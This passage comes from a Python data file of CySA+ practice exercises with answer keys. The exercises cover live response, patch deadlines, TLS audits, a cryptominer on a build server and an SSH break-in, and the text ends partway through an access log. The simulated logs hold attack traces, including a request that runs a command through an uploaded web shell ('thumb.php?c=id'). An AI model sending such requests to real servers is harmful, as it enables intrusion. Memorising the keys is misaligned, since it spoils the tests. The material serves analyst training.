"""CySA+ performance-based exercises — hands-on, scored, mapped to CS0-003.

Original scenarios, logs and explanations written against CompTIA's published
objectives. The class PBQ simulations in CySA+\\PBQSIM were read for the *skills
they exercise* only; no scenario text, log line, answer option or explanation
from them is reproduced here, because this repo is public. All external
addresses come from the documentation ranges (192.0.2.0/24, 198.51.100.0/24,
203.0.113.0/24) and all domains are invented or use .example.

Shape of a PBQ
--------------
    id         stable key (localStorage, and the page's #anchor)
    obj        default CS0-003 objective for every scored field
    title      short name
    scenario   the situation, as an analyst would receive it
    task       what the learner has to do
    evidence   tabs shown beside the questions (may be empty)
    questions  the scored work

Evidence kinds
    log       {label, cmd?, body}                     monospace output
    table     {label, caption?, head, rows, mono?}
    doc       {label, fields:[[k, v]], paras:[...]}   email, ticket, policy
    terminal  {label, prompt, banner, help, cmds:[{match:[regex], out}], miss?}

Question kinds (every one may carry its own obj, overriding the PBQ's)
    select    {prompt, options, answer:int, why}               1 point
    text      {prompt, answers:[accepted], why, placeholder?}  1 point
    multi     {prompt, options, answer:[int], why}             1 point, exact set
    grid      {prompt, rows, cols, answer:[[bool]], rowwhy}    1 point per row
    order     {prompt, items (correct order), why}             1 point per position
    match     {prompt, choices, items:[{text, answer, why}]}   1 point per item
"""

PBQS = [

# ---------------------------------------------------------------------------
{
 'id': 'live-response',
 'obj': '1.3',
 'title': 'Live Response on a Finance Workstation',
 'scenario':
   "EDR raised a medium-severity alert on FIN-WS14 (10.20.4.57), a finance "
   "workstation used by M. Lopez: repeated outbound connections to an address "
   "nobody recognizes. You opened a live-response session and collected four "
   "outputs. The console dropped the command line from the first two.",
 'task':
   "Work out which command produced Outputs 1 and 2, trace the suspicious "
   "connection to a process and a file on disk, and choose the next step.",
 'evidence': [
  {'kind': 'log', 'label': 'Output 1', 'body':
"""Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1012
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1288
  TCP    10.20.4.57:139         0.0.0.0:0              LISTENING       4
  TCP    10.20.4.57:50211       198.51.100.10:443      ESTABLISHED     4108
  TCP    10.20.4.57:50340       198.51.100.45:443      ESTABLISHED     4388
  TCP    10.20.4.57:50341       198.51.100.45:443      TIME_WAIT       0
  TCP    10.20.4.57:51544       203.0.113.77:8443      ESTABLISHED     6120
  TCP    10.20.4.57:51561       203.0.113.77:8443      SYN_SENT        6120
  UDP    0.0.0.0:5353           *:*                                    1012"""},
  {'kind': 'log', 'label': 'Output 2', 'body':
"""Windows IP Configuration

    outlook.office365.com
    ----------------------------------------
    Record Name . . . . . : outlook.office365.com
    Record Type . . . . . : 1
    Time To Live  . . . . : 142
    Data Length . . . . . : 4
    Section . . . . . . . : Answer
    A (Host) Record . . . : 198.51.100.10

    intranet.harborline.example
    ----------------------------------------
    Record Name . . . . . : intranet.harborline.example
    Record Type . . . . . : 1
    Time To Live  . . . . : 2961
    Data Length . . . . . : 4
    Section . . . . . . . : Answer
    A (Host) Record . . . : 198.51.100.45

    cdn-update-sync.net
    ----------------------------------------
    Record Name . . . . . : cdn-update-sync.net
    Record Type . . . . . : 1
    Time To Live  . . . . : 58
    Data Length . . . . . : 4
    Section . . . . . . . : Answer
    A (Host) Record . . . : 203.0.113.77"""},
  {'kind': 'log', 'label': 'Output 3', 'cmd': 'C:\\> tasklist /svc', 'body':
"""Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
services.exe                   712 N/A
svchost.exe                    904 BrokerInfrastructure, DcomLaunch, PlugPlay,
                                   Power
svchost.exe                   1012 RpcEptMapper, RpcSs
svchost.exe                   1288 TermService
explorer.exe                  3312 N/A
OUTLOOK.EXE                   4108 N/A
chrome.exe                    4388 N/A
WINWORD.EXE                   5528 N/A
svchost.exe                   6120 N/A"""},
  {'kind': 'log', 'label': 'Output 4',
   'cmd': 'C:\\> wmic process get ExecutablePath,ParentProcessId,ProcessId', 'body':
"""ExecutablePath                                                ParentProcessId  ProcessId
C:\\Windows\\system32\\services.exe                               664              712
C:\\Windows\\system32\\svchost.exe                                712              904
C:\\Windows\\system32\\svchost.exe                                712              1012
C:\\Windows\\system32\\svchost.exe                                712              1288
C:\\Windows\\Explorer.EXE                                         3260             3312
C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE    3312             4108
C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe          3312             4388
C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE    4108             5528
C:\\Users\\mlopez\\AppData\\Roaming\\Microsoft\\svchost.exe          5528             6120"""},
 ],
 'questions': [
  {'kind': 'select', 'prompt': 'Which command produced Output 1?',
   'options': ['netstat -ano', 'netstat -r', 'arp -a', 'nbtstat -n'],
   'answer': 0,
   'why': "Protocol, local and foreign address, state and a PID column is the "
          "signature of netstat with -a (all connections and listeners), -n "
          "(numeric, no name lookups) and -o (owning PID). netstat -r prints the "
          "routing table, arp -a maps IP addresses to MAC addresses, and nbtstat "
          "shows NetBIOS names. The PID column is what lets you pivot to a process."},
  {'kind': 'select', 'prompt': 'Which command produced Output 2?',
   'options': ['ipconfig /displaydns', 'nslookup cdn-update-sync.net',
               'ipconfig /all', 'Get-DnsClientServerAddress'],
   'answer': 0,
   'why': "Repeated Record Name / Record Type / Time To Live blocks are the "
          "local resolver cache, which ipconfig /displaydns dumps. nslookup "
          "queries one name and opens with the server it asked. ipconfig /all "
          "shows adapter settings, and Get-DnsClientServerAddress lists configured "
          "DNS servers, not cached answers. The cache is what ties 203.0.113.77 "
          "back to a domain name you can block and hunt for."},
  {'kind': 'text', 'prompt': 'What is the PID of the process talking to the suspicious address?',
   'answers': ['6120'], 'placeholder': 'PID',
   'why': "Both connections to 203.0.113.77:8443 in Output 1 belong to PID 6120. "
          "The short TTL on the cached record (58 seconds) fits infrastructure that "
          "changes addresses often, which is worth noting in the ticket."},
  {'kind': 'select', 'prompt': 'Which file is responsible for the malicious behavior?',
   'options': ['C:\\Users\\mlopez\\AppData\\Roaming\\Microsoft\\svchost.exe',
               'C:\\Windows\\system32\\svchost.exe',
               'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
               'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'],
   'answer': 0,
   'why': "PID 6120 resolves in Output 4 to an svchost.exe under the user's "
          "Roaming profile. The genuine svchost.exe only ever runs from System32. "
          "WINWORD.EXE is the parent that launched it, which makes Word part of the "
          "story (likely the delivery vehicle), but Word is not the file doing the "
          "beaconing."},
  {'kind': 'select', 'prompt': 'Which observation is the strongest indicator that PID 6120 is malicious?',
   'options': ['It is named svchost.exe, hosts no services, runs from a user profile, and its parent is Word',
               'It holds an established HTTPS-style connection to the internet',
               'It uses high-numbered local ports such as 51544',
               'It appears in tasklist alongside other svchost.exe instances'],
   'answer': 0,
   'why': "Real svchost.exe is started by services.exe (PID 712 here) and always "
          "hosts at least one service; tasklist /svc shows N/A for 6120. A system "
          "binary name in the wrong path with the wrong parent is masquerading. "
          "Outbound HTTPS and ephemeral local ports are normal for almost every "
          "process, so on their own they prove nothing."},
  {'kind': 'select', 'obj': '3.2', 'prompt': 'What should you do next?',
   'options': ['Network-contain the host through EDR, then capture memory before killing the process',
               'Kill PID 6120, delete the file and reboot the workstation',
               'Block 203.0.113.77 at the firewall and close the alert',
               'Reimage FIN-WS14 immediately from the standard build'],
   'answer': 0,
   'why': "Containment stops the beaconing without destroying evidence. Memory is "
          "the most volatile source and holds what the process decrypted, injected "
          "and connected to, so it is captured before the process dies. Killing and "
          "deleting first loses that. Blocking one IP misses the next address the "
          "domain resolves to, and reimaging erases the scope you still need: how "
          "it arrived through Word, and whether other hosts received it."},
 ],
},

# ---------------------------------------------------------------------------
# 'killchain' (v2 content) is inserted at position 1 at the bottom of this file.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
{
 'id': 'patch-window',
 'obj': '2.5',
 'title': 'Remediation Deadlines',
 'scenario':
   "Harborline Freight's weekly authenticated scan finished overnight. The "
   "vulnerability management standard sets deadlines by severity and by where the "
   "asset sits. The change board meets this afternoon and wants each finding's "
   "deadline and a plan for the one that has no patch.",
 'task':
   "Use the remediation standard and the environment map to set a deadline for "
   "each finding, then answer the planning questions.",
 'evidence': [
  {'kind': 'table', 'label': 'Standard', 'caption': 'Remediation deadlines (calendar days from detection)',
   'head': ['Severity', 'CVSS v3.1 base', 'Production', 'Non-production'],
   'rows': [['Critical', '9.0 – 10.0', '7', '21'],
            ['High', '7.0 – 8.9', '14', '30'],
            ['Medium', '4.0 – 6.9', '30', '60'],
            ['Low', '0.1 – 3.9', '90', '90']]},
  {'kind': 'doc', 'label': 'Rules', 'fields': [], 'paras': [
     "Internet-facing production assets: halve the production deadline, rounding down to a whole day.",
     "A finding is closed only when a follow-up scan no longer reports it. A change ticket or a patch tool showing \"installed\" does not close it.",
     "Where no vendor fix exists, a compensating control must be in place within the same deadline, and a risk exception must be filed with the CISO and reviewed every 90 days.",
  ]},
  {'kind': 'table', 'label': 'Environments',
   'head': ['Environment', 'Subnet', 'Tier', 'Internet-facing'],
   'rows': [['prod-edge', '172.16.10.0/24', 'Production', 'Yes'],
            ['prod-core', '172.16.20.0/24', 'Production', 'No'],
            ['staging', '172.16.30.0/24', 'Non-production', 'No'],
            ['dev', '172.16.40.0/24', 'Non-production', 'No']]},
  {'kind': 'log', 'label': 'Scan results', 'body':
"""F1  172.16.10.15   TLS Version 1.0 Protocol Detection
    Severity: Medium   CVSS v3.1: 5.3
    Solution: Disable TLS 1.0 and enable TLS 1.2 or later.

F2  172.16.20.31   Microsoft SQL Server Unsupported Version Detection
    Severity: High     CVSS v3.1: 7.5
    Solution: Upgrade to a supported release. The vendor no longer
              publishes security updates for the installed version.

F3  172.16.40.12   OpenSSH < 9.8p1 Signal Handler Race (CVE-2024-6387)
    Severity: High     CVSS v3.1: 8.1
    Solution: Upgrade OpenSSH to 9.8p1 or later.

F4  172.16.30.8    Jenkins CLI Arbitrary File Read (CVE-2024-23897)
    Severity: Critical CVSS v3.1: 9.8
    Solution: Upgrade Jenkins to a fixed release.

F5  172.16.10.30   Apache HTTP Server 2.4.50 Path Traversal and RCE
                   (CVE-2021-42013)
    Severity: Critical CVSS v3.1: 9.8
    Solution: Upgrade Apache HTTP Server to 2.4.51 or later."""},
 ],
 'questions': [
  {'kind': 'text', 'prompt': 'F1 — deadline in days', 'answers': ['15'], 'placeholder': 'days',
   'why': "Medium in production is 30 days. 172.16.10.15 is in prod-edge, which is "
          "internet-facing, so the deadline halves to 15."},
  {'kind': 'text', 'prompt': 'F2 — deadline in days', 'answers': ['14'], 'placeholder': 'days',
   'why': "High in production is 14 days. prod-core is not internet-facing, so no "
          "halving. The lack of a patch does not extend the deadline; it changes "
          "what has to happen inside it."},
  {'kind': 'text', 'prompt': 'F3 — deadline in days', 'answers': ['30'], 'placeholder': 'days',
   'why': "High in non-production is 30 days. 172.16.40.12 is in dev. The finding "
          "is serious, but the standard prices in that dev is not where customer "
          "data or revenue lives."},
  {'kind': 'text', 'prompt': 'F4 — deadline in days', 'answers': ['21'], 'placeholder': 'days',
   'why': "Critical in non-production is 21 days. 172.16.30.8 is staging. A 9.8 "
          "on an internal build server is still a fast-moving item, because build "
          "servers hold credentials for production."},
  {'kind': 'text', 'prompt': 'F5 — deadline in days', 'answers': ['3'], 'placeholder': 'days',
   'why': "Critical in production is 7 days; prod-edge halves it to 3.5, and the "
          "rule rounds down to 3. An internet-facing path traversal with a public "
          "exploit is the finding attackers will reach first."},
  {'kind': 'select', 'obj': '2.3', 'prompt': 'Which finding goes to the top of the queue?',
   'options': ['F5', 'F4', 'F2', 'F3'], 'answer': 0,
   'why': "F4 and F5 share a 9.8 base score, so the score alone does not break the "
          "tie. Exposure does: F5 is reachable from the internet with a well-known "
          "exploit, and it has the shortest deadline in the batch."},
  {'kind': 'select', 'prompt': 'F2 has no vendor fix for its installed version. What is the right plan?',
   'options': ['Schedule the upgrade to a supported release; until then, restrict the host to its application servers with a firewall rule and file a risk exception',
               'Apply the latest cumulative update for the installed version',
               'Accept the risk without an exception, because the host is not internet-facing',
               'Block TCP 443 to the host at the perimeter firewall'],
   'answer': 0,
   'why': "With no patch to apply, the standard requires a compensating control "
          "inside the same 14 days plus an exception the CISO owns. Narrowing who "
          "can reach the database reduces exposure while the upgrade is planned. "
          "There are no updates left to install, internal does not mean exempt, and "
          "443 is not the database's port."},
  {'kind': 'select', 'obj': '2.3', 'prompt': 'The change board asks why F4 (9.8) gets 21 days when F2 (7.5) gets 14. What is the best answer?',
   'options': ['The base score measures the flaw itself; the standard adjusts priority for where the asset sits, which is the same idea as CVSS environmental metrics',
               'The scanner scored F4 incorrectly and it should be re-rated as High',
               'Non-production findings do not count toward risk',
               'Critical findings are always scheduled after High findings'],
   'answer': 0,
   'why': "CVSS base metrics describe the vulnerability in isolation. How much it "
          "matters to this organization depends on asset criticality and exposure, "
          "which CVSS models in its environmental group and this standard models "
          "with the production split. Nothing says the score is wrong, and "
          "non-production risk still counts, just on a longer clock."},
  {'kind': 'select', 'prompt': 'The web team reports F5 patched. When can the finding be closed?',
   'options': ['When a follow-up scan of 172.16.10.30 no longer reports it',
               'When the change ticket is marked complete',
               'When the patch management console shows the update as installed',
               'When the vendor advisory is attached to the ticket'],
   'answer': 0,
   'why': "Validation is part of remediation. A rescan confirms the vulnerable "
          "version is actually gone from the listening service, which catches the "
          "common failures: the wrong host patched, a service never restarted, or "
          "a second instance still running the old build."},
 ],
},

# ---------------------------------------------------------------------------
{
 'id': 'tls-baseline',
 'obj': '2.2',
 'title': 'Web Tier Baseline Audit',
 'scenario':
   "You are verifying four public web servers against the hardening baseline "
   "before a compliance review. A colleague collected a header check and a TLS "
   "enumeration from each server.",
 'task':
   "Part 1: tick each requirement the server meets. Part 2: choose the change "
   "that brings each server into compliance.",
 'evidence': [
  {'kind': 'doc', 'label': 'Baseline', 'fields': [], 'paras': [
     "1. Only TLS 1.2 and TLS 1.3 may be offered.",
     "2. The web server must run the approved build: nginx/1.26.2.",
     "3. Every HTTPS response must carry a Strict-Transport-Security header.",
  ]},
  {'kind': 'log', 'label': 'web01', 'cmd': '$ curl -sI https://web01.harborline.example',
   'body':
"""HTTP/1.1 200 OK
Server: nginx/1.26.2
Date: Sun, 25 Oct 2026 18:04:12 GMT
Content-Type: text/html; charset=utf-8
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff

$ nmap --script ssl-enum-ciphers -p 443 web01.harborline.example
PORT    STATE SERVICE
443/tcp open  https
| ssl-enum-ciphers:
|   TLSv1.2:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (secp256r1) - A
|     cipher preference: server
|   TLSv1.3:
|     ciphers:
|       TLS_AKE_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A
|       TLS_AKE_WITH_CHACHA20_POLY1305_SHA256 (ecdh_x25519) - A
|       TLS_AKE_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A
|     cipher preference: server
|_  least strength: A"""},
  {'kind': 'log', 'label': 'web02', 'cmd': '$ curl -sI https://web02.harborline.example',
   'body':
"""HTTP/1.1 200 OK
Server: nginx/1.26.2
Date: Sun, 25 Oct 2026 18:04:19 GMT
Content-Type: text/html; charset=utf-8
X-Content-Type-Options: nosniff

$ nmap --script ssl-enum-ciphers -p 443 web02.harborline.example
PORT    STATE SERVICE
443/tcp open  https
| ssl-enum-ciphers:
|   TLSv1.0:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A
|     cipher preference: server
|   TLSv1.2:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A
|     cipher preference: server
|_  least strength: A"""},
  {'kind': 'log', 'label': 'web03', 'cmd': '$ curl -sI https://web03.harborline.example',
   'body':
"""HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Sun, 25 Oct 2026 18:04:25 GMT
Content-Type: text/html; charset=utf-8
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff

$ nmap --script ssl-enum-ciphers -p 443 web03.harborline.example
PORT    STATE SERVICE
443/tcp open  https
| ssl-enum-ciphers:
|   TLSv1.2:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A
|     cipher preference: server
|   TLSv1.3:
|     ciphers:
|       TLS_AKE_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A
|       TLS_AKE_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A
|     cipher preference: server
|_  least strength: A"""},
  {'kind': 'log', 'label': 'web04', 'cmd': '$ curl -sI https://web04.harborline.example',
   'body':
"""HTTP/1.1 200 OK
Server: nginx/1.26.2
Date: Sun, 25 Oct 2026 18:04:31 GMT
Content-Type: text/html; charset=utf-8
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff

$ nmap --script ssl-enum-ciphers -p 443 web04.harborline.example
PORT    STATE SERVICE
443/tcp open  https
| ssl-enum-ciphers:
|   TLSv1.1:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A
|     cipher preference: server
|   TLSv1.2:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A
|     cipher preference: server
|   TLSv1.3:
|     ciphers:
|       TLS_AKE_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A
|     cipher preference: server
|_  least strength: A"""},
 ],
 'questions': [
  {'kind': 'grid', 'prompt': 'Part 1 — tick each requirement the server meets.',
   'rows': ['web01', 'web02', 'web03', 'web04'],
   'cols': ['TLS 1.2/1.3 only', 'Approved nginx build', 'HSTS header'],
   'answer': [[True, True, True],
              [False, True, False],
              [True, False, True],
              [False, True, True]],
   'rowwhy': [
     "Compliant on all three: only TLSv1.2 and TLSv1.3 sections, nginx/1.26.2, "
     "and an HSTS header.",
     "Offers TLSv1.0 and sends no Strict-Transport-Security header. The build is "
     "correct. Note that every cipher is graded A; a strong cipher does not make a "
     "deprecated protocol version acceptable.",
     "TLS and HSTS are fine, but the Server header reports nginx/1.22.1, an older "
     "build than the baseline allows.",
     "Build and HSTS are fine, but a TLSv1.1 section is present. One extra protocol "
     "section is all it takes to fail the requirement.",
   ]},
  {'kind': 'match', 'obj': '2.4', 'prompt': 'Part 2 — choose the change each server needs.',
   'choices': ['No change required',
               'Upgrade nginx to the approved 1.26.2 build',
               'Limit ssl_protocols to TLSv1.2 TLSv1.3',
               'Limit ssl_protocols to TLSv1.2 TLSv1.3 and add the HSTS header',
               'Replace the certificate with one from a public CA'],
   'items': [
     {'text': 'web01', 'answer': 'No change required',
      'why': "Already meets the baseline. Recommending changes to a compliant "
             "server costs change-window time and adds risk for no gain."},
     {'text': 'web02', 'answer': 'Limit ssl_protocols to TLSv1.2 TLSv1.3 and add the HSTS header',
      'why': "Two failures, so the fix has to cover both. Fixing the protocol list "
             "alone leaves the header missing."},
     {'text': 'web03', 'answer': 'Upgrade nginx to the approved 1.26.2 build',
      'why': "The only failure is the version string. Nothing in the evidence "
             "points at the certificate, so replacing it would not move the audit."},
     {'text': 'web04', 'answer': 'Limit ssl_protocols to TLSv1.2 TLSv1.3',
      'why': "Remove TLSv1.1 from the configuration. HSTS is already present with "
             "a long max-age, so the narrower change is the right one."},
   ]},
  {'kind': 'select', 'prompt': 'Which collected output could prove web02 offers TLS 1.0?',
   'options': ['The nmap ssl-enum-ciphers output', 'The curl -sI header output',
               'Either one', 'Neither; you would need a packet capture'],
   'answer': 0,
   'why': "curl -I negotiates one connection at the best version both sides "
          "support and reports headers, so it never reveals what else the server "
          "would accept. ssl-enum-ciphers tries each protocol version in turn and "
          "lists the ones that succeed, which is exactly the question."},
 ],
},

# ---------------------------------------------------------------------------
{
 'id': 'port-recon',
 'obj': '2.2',
 'title': 'Service Discovery with Nmap',
 'scenario':
   "Five servers on the 10.40.8.0/24 segment arrived from an acquisition with "
   "no documentation beyond their DNS names. Before they join the main network, "
   "you need to know what each one does and whether it breaks the cleartext "
   "services policy.",
 'task':
   "Scan each host from the console (type help for usage). For every server, "
   "record its role, its IP address and the port that breaks policy.",
 'evidence': [
  {'kind': 'terminal', 'label': 'Console', 'prompt': 'analyst@scanbox:~$',
   'banner': "Hosts to scan: srv1.hq.lab  srv2.hq.lab  srv3.hq.lab  srv4.hq.lab  srv5.hq.lab\nType help for usage.",
   'help': "usage: nmap [options] <host>\n  e.g. nmap -sV -sC srv1.hq.lab\nother commands: help, clear, hosts",
   'cmds': 'NMAP'},   # filled in below
  {'kind': 'doc', 'label': 'Policy', 'fields': [], 'paras': [
     "Prohibited services: Telnet (23), FTP (21), POP3 (110) and IMAP (143).",
     "HTTP is allowed only on port 80, and only where it does nothing but redirect to HTTPS. HTTP on any other port, or a port 80 listener that serves content, is a violation.",
     "Each server below has exactly one violation.",
  ]},
 ],
 'questions': 'PORTQ',   # built below
},

# ---------------------------------------------------------------------------
{
 'id': 'build-server',
 'obj': '1.2',
 'title': 'Ticket: The Slow Build Server',
 'scenario':
   "A help-desk ticket landed in the SOC queue because the infrastructure team "
   "has run out of ideas. Builds on the shared CI server have slowed to a crawl. "
   "The ticket, the server's details, the recent change log and two command "
   "outputs are attached.",
 'task':
   "Find the cause, separate it from the change that looks guilty, and decide "
   "what happens next.",
 'evidence': [
  {'kind': 'doc', 'label': 'Ticket', 'fields': [
     ['Ticket', 'INC-48113'], ['Priority', 'High'], ['Opened', 'Thu 2026-10-22 09:05'],
     ['Reported by', 'D. Okafor, Release Engineering'],
     ['Asset', 'ci-build01 (10.30.2.40), Ubuntu 24.04, 16 vCPU, 32 GB RAM']],
   'paras': [
     "Builds that took 12 minutes on Monday now take 40 or more, and two nightly jobs timed out. Infrastructure checked the storage array and the network: no errors, normal throughput.",
     "Most of the team blames Monday's kernel patch and wants to roll it back tonight. Please confirm before we do.",
  ]},
  {'kind': 'table', 'label': 'Change log',
   'head': ['When', 'Who', 'Change'],
   'rows': [['Mon 10-19 22:10', 'mfarid (sysadmin)', 'Kernel and OpenSSL security updates applied; host rebooted'],
            ['Tue 10-20 10:30', 'D. Okafor', 'Build times normal (12 min) on the morning release'],
            ['Tue 10-20 13:52', 'pvance (developer)', 'Installed Jenkins plugin "fast-artifact-cache" from a direct download link shared in a forum'],
            ['Tue 10-20 14:40', 'D. Okafor', 'First slow build reported (31 min)'],
            ['Wed 10-21 03:00', 'scheduler', 'Nightly integration job timed out']]},
  {'kind': 'log', 'label': 'top', 'cmd': 'mfarid@ci-build01:~$ top -b -n1 | head -14', 'body':
"""top - 09:41:07 up 2 days, 11:31,  1 user,  load average: 15.82, 15.61, 15.40
Tasks: 214 total,   2 running, 212 sleeping,   0 stopped,   0 zombie
%Cpu(s): 97.8 us,  1.4 sy,  0.0 ni,  0.6 id,  0.0 wa,  0.0 hi,  0.2 si,  0.0 st
MiB Mem :  32041.3 total,  18220.4 free,   9310.7 used,   4510.2 buff/cache
MiB Swap:   4096.0 total,   4096.0 free,      0.0 used.  22730.6 avail Mem

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
  48211 jenkins   20   0 2471208   2.1g   3144 S  1532  6.7  3712:45 .syslogd
   1407 jenkins   20   0   10.4g   3.9g  41212 S  22.1 12.4  88:10.31 java
    911 root      20   0  210992  12804   9216 S   0.3  0.0   1:02.17 systemd-journal
      1 root      20   0  167808  13180   8452 S   0.0  0.0   0:07.40 systemd"""},
  {'kind': 'log', 'label': 'ss / proc', 'cmd': 'mfarid@ci-build01:~$ sudo ss -tnp state established', 'body':
"""Recv-Q Send-Q   Local Address:Port      Peer Address:Port  Process
0      0          10.30.2.40:22         10.30.0.15:51120  users:(("sshd",pid=50102,fd=4))
0      0          10.30.2.40:8080       10.30.5.88:61944  users:(("java",pid=1407,fd=211))
0      0          10.30.2.40:44718    203.0.113.140:3333   users:(("\\.syslogd",pid=48211,fd=12))

mfarid@ci-build01:~$ sudo ls -l /proc/48211/exe
lrwxrwxrwx 1 jenkins jenkins 0 Oct 22 09:41 /proc/48211/exe -> /var/lib/jenkins/.cache/.x/.syslogd"""},
 ],
 'questions': [
  {'kind': 'select', 'prompt': 'What is the most likely cause of the slowdown?',
   'options': ['An unauthorized cryptocurrency miner running as the jenkins user',
               "Monday's kernel update degrading scheduler performance",
               'A failing disk in the storage array',
               'Network saturation between the build server and the artifact store'],
   'answer': 0,
   'why': "One process owned by jenkins is using about fifteen cores (1532% CPU) "
          "under a name that imitates a system daemon, from a hidden directory in "
          "the jenkins home, while holding a connection to port 3333 on an outside "
          "address. Sustained maximum CPU plus an outbound pool connection is the "
          "profile of a miner. Storage and network were already checked clean."},
  {'kind': 'select', 'prompt': 'Which evidence rules out the kernel patch?',
   'options': ['Builds were normal Tuesday morning, after the patch, and slowed only after the plugin install that afternoon',
               'The kernel patch was applied by a sysadmin, so it was authorized',
               'Memory usage is below 50%',
               'The server has been up for more than a day'],
   'answer': 0,
   'why': "Correlate the timeline. If the patch were the cause, Tuesday's 10:30 "
          "build would have been slow too. The first slow build follows the plugin "
          "install by under an hour. Rolling back a security patch on a hunch would "
          "have reopened known vulnerabilities and fixed nothing."},
  {'kind': 'text', 'prompt': 'Which remote port is the suspicious process connected to?',
   'answers': ['3333'], 'placeholder': 'port',
   'why': "Port 3333 is widely used for Stratum, the protocol miners speak to "
          "mining pools. A port number is a lead, not proof, but together with the "
          "CPU profile it is a strong one."},
  {'kind': 'select', 'prompt': 'Whose activity should be reviewed first?',
   'options': ['pvance, who installed the plugin from a forum link',
               'mfarid, who applied the kernel update',
               'D. Okafor, who opened the ticket',
               'The scheduler account that runs nightly jobs'],
   'answer': 0,
   'why': "The binary lives in the jenkins service account's cache, and the only "
          "change that ran code as jenkins in the window was the third-party plugin. "
          "This is a review of how it got in, not an accusation: an unvetted plugin "
          "from a direct link bypasses the update center's checks."},
  {'kind': 'select', 'obj': '3.2', 'prompt': 'What is the right next step?',
   'options': ['Contain ci-build01, preserve the binary and process memory, then rotate every credential Jenkins stores',
               'Roll back the kernel update tonight as the team proposed',
               'Kill PID 48211 and close the ticket as resolved',
               'Add CPU to the virtual machine so builds finish on time'],
   'answer': 0,
   'why': "A miner is the visible payload, but the plugin gave an outsider code "
          "execution as jenkins, and a build server holds deploy keys, repository "
          "tokens and cloud credentials. Contain it, keep evidence, and assume those "
          "secrets are exposed. Killing the process leaves the plugin in place to "
          "start it again."},
 ],
},

# ---------------------------------------------------------------------------
{
 'id': 'after-hours',
 'obj': '1.2',
 'title': 'After-Hours Upload',
 'scenario':
   "The web content team publishes pages to web01 (10.20.1.15) over SSH from "
   "the office network, 10.10.5.0/24, during business hours. The overnight "
   "on-call analyst saw a new outbound connection from web01 at 02:20 and "
   "pulled three sources.",
 'task':
   "Identify the address of concern and the indicator of compromise, then "
   "choose the corrective actions.",
 'evidence': [
  {'kind': 'log', 'label': 'auth.log', 'cmd': '/var/log/auth.log (excerpt)', 'body':
"""Oct 20 09:12:44 web01 sshd[2188]: Accepted publickey for webdev from 10.10.5.23 port 61790 ssh2: ED25519 SHA256:q3Lw...
Oct 20 17:30:02 web01 sshd[2188]: pam_unix(sshd:session): session closed for user webdev
Oct 21 02:10:01 web01 sshd[30411]: Failed password for webdev from 198.51.100.66 port 50122 ssh2
Oct 21 02:10:04 web01 sshd[30411]: Failed password for webdev from 198.51.100.66 port 50122 ssh2
Oct 21 02:10:09 web01 sshd[30414]: Failed password for webdev from 198.51.100.66 port 50130 ssh2
  ... 212 similar lines from 198.51.100.66 between 02:10:09 and 02:13:58 ...
Oct 21 02:14:02 web01 sshd[30580]: Accepted password for webdev from 198.51.100.66 port 50391 ssh2
Oct 21 02:14:02 web01 sshd[30580]: pam_unix(sshd:session): session opened for user webdev
Oct 21 02:15:30 web01 sftp-server[30588]: open "/var/www/html/uploads/thumb.php" flags WRITE,CREATE,TRUNCATE mode 0644
Oct 21 02:15:31 web01 sftp-server[30588]: close "/var/www/html/uploads/thumb.php" bytes read 0 written 1214
Oct 21 02:16:05 web01 sshd[30580]: pam_unix(sshd:session): session closed for user webdev"""},
  {'kind': 'log', 'label': 'access.log', 'cmd': '/var/log/nginx/access.log (excerpt)', 'body':
"""10.10.5.23 - - [20/Oct/2026:09:20:11 +0000] "GET /about.html HTTP/1.1" 200 8812 "-" "Mozilla/5.0"
192.0.2.44 - - [21/Oct/2026:01:58:12 +0000] "GET /wp-admin/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
192.0.2.44 - - [21/Oct/2026:01:58:12 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
192.0.2.44 - - [21/Oct/2026:01:58:13 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
198.51.100.66 - - [21/Oct/2026:02:17:11 +0000] "GET /uploads/thumb.php?c=id HTTP/1.1" 200 54 "-" "curl/8.5.0"
